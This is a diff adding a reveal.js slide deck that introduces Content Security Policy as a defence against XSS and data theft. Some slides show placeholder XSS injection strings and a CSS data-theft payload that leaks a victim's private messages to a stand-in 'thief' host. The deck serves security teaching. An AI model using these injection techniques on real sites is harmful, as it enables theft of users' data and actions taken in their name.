@@ -1,0 +1,425 @@
+<!doctype html>
+<html lang="en">
+
+    <head>
+        <meta charset="utf-8">
+
+        <title>Content Security Policy</title>
+
+        <meta name="author" content="naugtur">
+
+        <meta name="apple-mobile-web-app-capable" content="yes" />
+        <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent" />
+
+        <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+
+        <link rel="stylesheet" href="../reveal.js/css/reveal.min.css">
+        <link rel="stylesheet" href="../reveal.js/css/theme/default.css" id="theme">
+        <link rel="stylesheet" href="branding/style.css" id="branding">
+
+        <!-- For syntax highlighting -->
+        <link rel="stylesheet" href="../reveal.js/lib/css/zenburn.css">
+
+        <!-- If the query includes 'print-pdf', include the PDF print sheet -->
+        <script>
+            if (window.location.search.match(/print-pdf/gi)) {
+                var link = document.createElement('link');
+                link.rel = 'stylesheet';
+                link.type = 'text/css';
+                link.href = '../reveal.js/css/print/pdf.css';
+                document.getElementsByTagName('head')[0].appendChild(link);
+            }
+        </script>
+
+
+        <!--[if lt IE 9]>
+<script src="../reveal.js/lib/js/html5shiv.js"></script>
+<![endif]-->
+    </head>
+
+    <body>
+
+        <div class="reveal" id="naugtur">
+
+            <!-- Any section element inside of this container is displayed as a slide -->
+            <div class="slides">
+                <section>
+                    <h1>Hackers!</h1>
+                    <h3 class="pad1">how to keep them at bay</h3>
+                    <p>
+                        Introduction to Content Security Policy
+                    </p>
+                </section>
+                <section>
+                    <h2>Who's that guy?</h2>
+
+
+                    <div class="pad1">
+                        <p>
+                            Zbyszek Tenerowicz
+                        </p><p class="pad1">
+                        @naugtur <br>
+                        http://naugtur.pl
+                        </p>
+                    </div>
+
+
+
+                    <div class="pad1">
+                        <div style="width: 48%; float:left">
+                            <p>
+                                R&D at    
+                            </p>
+                            <div style="background: url('eg.png') no-repeat center; height: 90px;"></div>
+                        </div>
+                        <div style="width: 48%; float:right">
+                            <p>
+                                Regular speaker at    
+                            </p>
+                            <div style="background: url('mjs.png') no-repeat center; height: 90px;"></div>
+                        </div>
+                    </div>
+
+
+                </section>
+
+                <section>
+
+                    <h2 class="pad1">Dangers</h2>
+
+                    <h4 class="fragment">Clickjacking</h4>
+                    <h4 class="fragment">Data theft</h4>
+                    <h4 class="fragment">CSRF</h4>
+                    <h4 class="fragment">XSS</h4>
+                    <h4 class="fragment">Session hijack</h4>
+                    <img class="pad1 plain fragment" src="shroom.png">
+
+                </section>
+
+                <section>
+
+                    <h2>Popular security</h2>
+                    <p>Not in the scope for today</p>
+
+                    <div class="pad1" style="text-align: left; width: 50%; margin: 0 auto">
+
+                        <p>&#10004; Session cookies: </p>
+                        <pre><code> domain, secure, httponly</code></pre>
+                        <p>&#10004; <code>X-Iframe-Options</code> header</p>
+                        <p>&#10004; Iframe sandboxing</p>
+                        <p>&#10004; CSRF tokens</p>
+
+                    </div>
+
+
+
+                </section>
+
+                <section>
+
+                    <h2 class="pad1">Dangers left</h2>
+
+                    <h4>Persistent XSS</h4>
+                    <h4>Reflected XSS</h4>
+                    <h4>Data theft</h4>
+                    <img class="plain fragment" src="shroom.png">
+
+                </section>
+
+
+
+
+
+                <section>
+
+                    <h2>Where do threats come from?</h2>
+
+                </section>
+                <section data-background="gbu.png" >
+
+
+                    <div class="fragment pad1">
+                        <h3>The good</h3>
+                        <p>Bugs in application </p>
+                        <small class="fragment grow">&#10004; they can be fixed</small>
+                    </div>
+                    <div class="fragment pad1">
+                        <h3>The bad</h3>
+                        <p>Extensions, 3rd parties and user scripts </p>
+                        <small class="fragment grow">&#10008; at least they're not common...</small>
+                    </div>
+                    <div class="fragment pad1">
+                        <h3>The ugly</h3>
+                        <p>Vulnerable as specified</p>
+                        <small class="fragment grow">&#9762; iframes, clickjacking, <a href="http://scarybeastsecurity.blogspot.com/2009/12/generic-cross-browser-cross-domain.html">stealing data with CSS</a></small>
+                    </div>
+
+
+                </section>
+
+
+                <section>
+
+
+                    <h2>Persistent XSS</h2>
+                    <p class="pad1">Input is saved and application serves it to victims</p>
+
+                    <pre><code data-trim contenteditable  class="handlebars" >
+    <span class="avatar user-{{ username }}"></span>
+                        </code></pre>
+                    <pre><code data-trim contenteditable  class="html" >
+    foo" onmouseover="CODE"
+                        </code></pre>
+
+                    <p>or</p>
+
+                    <pre><code data-trim contenteditable  class="handlebars" >
+    <span class="user-label">{{ username }}</span>
+                        </code></pre>
+                    <pre><code data-trim contenteditable  class="html" >
+    &lt;script>CODE&lt;/script>
+                        </code></pre>
+
+                </section>
+
+
+                <section>    
+
+                    <h2>Reflected XSS</h2>
+                    <p class="pad1">Input is not stored by the application</p>
+                    <pre><code data-trim contenteditable  class="handlebars" >
+    <span>404 not found: {{ URL }}</span>
+                        </code></pre>
+                    <pre><code data-trim contenteditable  class="http" >
+    http://mydomain.com/&lt;script>CODE&lt;/script>
+                        </code></pre>
+
+
+
+                </section>
+
+                <section data-background="danger.png">
+
+                    <h2>XSS can be used to</h2>
+                    <div class="pad1" style="font-size: 1.2em; font-weight: bold">
+                        <p>Perform actions as currently logged-in user</p>
+                        <p>Steal data available to logged-in user</p>
+                        <p>Infect user with malware</p>
+                    </div>
+                    <p class="pad1">Wanna be a hacker? Start here: <a href="https://github.com/cure53/H5SC">https://github.com/cure53/H5SC</a></p>
+
+                </section>
+
+                <section>
+
+
+                    <h2>CSS data theft</h2>
+                    <ol>
+                        <li>Send a message:
+                            <pre><code contenteditable class="css">
+  ');}
+                        </code></pre>
+                        </li>
+                        <li>Wait for messages to steal</li>
+                        <li>Send a message:
+                            <pre><code contenteditable  class="css" >
+  {}body{background-image:url('http://thief/
+                        </code></pre>
+                        </li>
+                        <li>Make the user open a site where his inbox is loaded as CSS
+                            <pre><code class="html" contenteditable>
+  &lt;p>{}body{background-image:url('http://thief/
+  &lt;/p>&lt;p>private message&lt;/p>&lt;p>');}&lt;/p>
+                            </code></pre>
+                        </li>
+                    </ol>
+                    <p>Works with JavaScript disabled</p>
+
+                </section>
+
+                <section data-background="html5.png" >
+
+
+                    <img class="plain fragment" style="margin: 0 auto" src="hero.png">
+                    <h2>Content Security Policy</h2>
+
+
+                </section>
+                <section>
+                    <h2>Just add headers</h2>
+                    <br>
+                    <pre><code class="css" contenteditable>
+    Content-Security-Policy: 
+        script-src 'self' https://apis.google.com
+                        </code></pre>
+
+                    <a class="pad1 fragment current-visible" href="http://www.html5rocks.com/en/tutorials/security/content-security-policy/">Tutorial on html5rocks.com</a>
+
+
+                </section>
+                <section>
+                    <h2>Capabilities</h2>
+                    <ul class="pad2 noli">
+                        <li>Source whitelists for all resources</li>
+                        <aside class="notes">
+                            Sources: 
+                            scripts
+                            frames
+                            images
+                            styles
+                            fonts
+                            media
+                            objects
+                        </aside>
+                        <li>Block eval</li>
+                        <li>Block inline scripts</li>
+                        <li>Block event attributes</li>
+                    </ul>
+                    <div style="text-align: left; width: 70%; margin-left: 25%">
+
+                        <p class="fragment">&#10004; Any XSS bug in the app is now useless</p>
+                        <p class="fragment">&#10004; Extensions can't add code to your app</p>
+                        <p class="fragment">&#10004; Cross-domain requests to domains you approve</p>
+                        <p class="fragment">&#10008; Protects only HTML documents</p>
+
+                    </div>
+
+                </section>
+                <section>
+                    <h2>Browser support</h2>
+
+                    <aside class="notes">
+                        FF 4+;
+                        Chrome 14+;
+                        Safari 6+;
+                        Opera 15+;
+                        Latest mobile;
+                        IE 10+ implements ONLY the optional sandbox directive
+                    </aside>
+
+                    <img class="pad1 plain" src="brsupport.png">
+                    <div class="fragment current-visible">
+                        <p>Guess which directive is supported in IE</p>
+                        <img src="damnie.png">
+                    </div>
+                    <p class="fragment grow">
+                        Details: <a href="http://caniuse.com/#feat=contentsecuritypolicy">caniuse.com</a>
+                    </p>
+
+                </section>
+
+
+
+                <section>
+                    <h2 class="pad1">Example from github</h2>
+                    <pre><code contenteditable>
+    Content-Security-Policy:                    
+        default-src *; 
+        script-src 
+            https://github.global.ssl.fastly.net 
+            https://ssl.google-analytics.com 
+            https://collector-cdn.github.com; 
+        style-src 'self' 'unsafe-inline' 'unsafe-eval' 
+            https://github.global.ssl.fastly.net; 
+        object-src https://github.global.ssl.fastly.net
+                    </code></pre>
+                </section>
+                <section>
+                    <h2 class="pad1">Deployment</h2>
+                    <p>Check if your app breaks the policy without blocking it</p>
+                    <pre><code contenteditable>
+    Content-Security-Policy-Report-Only:
+        default-src "self"; report-uri /csp;
+                      </code></pre>
+                      
+                      <aside class="notes">Reporting can still be unstable in some browsers</aside>
+                    <aside class="notes">
+                        1. Content-Security-Policy-Report-Only
+                        2. Change app or loosen policy
+                        3. Remove "-Report-Only"
+                    </aside>
+                </section>
+                <section>
+                    <h2>What do I do with a report?</h2>
+                    <div class="fragment pad2">
+                        <h4>Install a logger</h4>
+                        <a href="https://github.com/mozilla/csp-logger">https://github.com/mozilla/csp-logger</a>
+                    </div>
+                    <div class="fragment">
+                        <p>It's a work in progress, but I'm on it</p>
+                    </div> 
+                                       
+                </section>
+
+                <section>
+
+                    <h3>naugtur</h3>
+                    <p>@naugtur <br>
+                        http://naugtur.pl</p>
+                </section>
+
+            </div>
+
+        </div>
+
+        <script src="../reveal.js/lib/js/head.min.js"></script>
+        <script src="../reveal.js/js/reveal.min.js"></script>
+
+        <script>
+            // Full list of configuration options available here:
+            // https://github.com/hakimel/reveal.js#configuration
+            Reveal.initialize({
+                controls: true,
+                progress: true,
+                history: true,
+                center: true,
+                mouseWheel: true,
+
+                theme: 'night',
+                transition: Reveal.getQueryHash().transition || 'concave', // default/cube/page/concave/zoom/linear/fade/none
+
+                // Parallax scrolling
+                // parallaxBackgroundImage: 'https://s3.amazonaws.com/hakim-static/reveal-js/reveal-parallax-1.jpg',
+                // parallaxBackgroundSize: '2100px 900px',
+
+                // Optional libraries used to extend on reveal.js
+                dependencies: [{
+                    src: '../reveal.js/lib/js/classList.js',
+                    condition: function() {
+                        return !document.body.classList;
+                    }
+                }, {
+                    src: '../reveal.js/plugin/markdown/marked.js',
+                    condition: function() {
+                        return !!document.querySelector('[data-markdown]');
+                    }
+                }, {
+                    src: '../reveal.js/plugin/markdown/markdown.js',
+                    condition: function() {
+                        return !!document.querySelector('[data-markdown]');
+                    }
+                }, {
+                    src: '../reveal.js/plugin/highlight/highlight.js',
+                    async: true,
+                    callback: function() {
+                        hljs.initHighlightingOnLoad();
+                    }
+                }, {
+                    src: '../reveal.js/plugin/zoom-js/zoom.js',
+                    async: true,
+                    condition: function() {
+                        return !!document.body.classList;
+                    }
+                }, {
+                    src: '../reveal.js/plugin/notes/notes.js',
+                    async: true,
+                    condition: function() {
+                        return !!document.body.classList;
+                    }
+                }]
+            });
+        </script>
+
+    </body>
+
+</html>
